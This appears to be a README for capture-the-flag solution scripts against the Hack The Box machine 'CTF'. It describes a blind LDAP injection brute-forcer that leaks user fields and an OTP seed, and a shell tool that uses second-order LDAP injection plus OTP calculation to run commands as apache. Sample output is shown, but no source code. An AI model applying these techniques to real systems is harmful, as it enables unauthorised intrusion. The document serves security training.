## Challenge

[CTF](https://www.hackthebox.eu/home/machines/profile/172) from Hackthebox.eu

## brute_stuff.py

### Description

I can use a blind ldap injection to brute force various fields in the ldap database.

### Reference

Originally published in blog posts: [https://0xdf.gitlab.io/2019/07/20/htb-ctf.html#leak-otp-seed](https://0xdf.gitlab.io/2019/07/20/htb-ctf.html#leak-otp-seed).

### Usage

```
root@kali# ./brute_stuff.py all
Bruting Username
ldapuser
Bruting mail
ldapuser@ctf.htb
Bruting pager
285449490011357156531651545652335570713167411445727140604172141456711102716717000
Bruting userPassword
```

## ctf-shell.py

### Description

The web page allows for commands to be run, but I must log in with a name that allows a second-order ldap injection, and then must use an extracted seed to calcuate the current OTP, taking into account time differences between my box and the target. It would be possible (and probably fun) to create a stateful shell using the same technique I used in [Stratosphere](https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html#building-a-shell). That is left as an exertize for the reader. This is a stateless shell.

### Reference

Originally published in blog posts as beyond root: [https://0xdf.gitlab.io/2019/07/20/htb-ctf.html#shell-as-apache-1](https://0xdf.gitlab.io/2019/07/20/htb-ctf.html#shell-as-apache-1).

### Usage

```
root@kali:~/hackthebox/ctf-10.10.10.122# ./ctf-shell.py 
CTF> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
CTF> pwd
/var/www/html
```
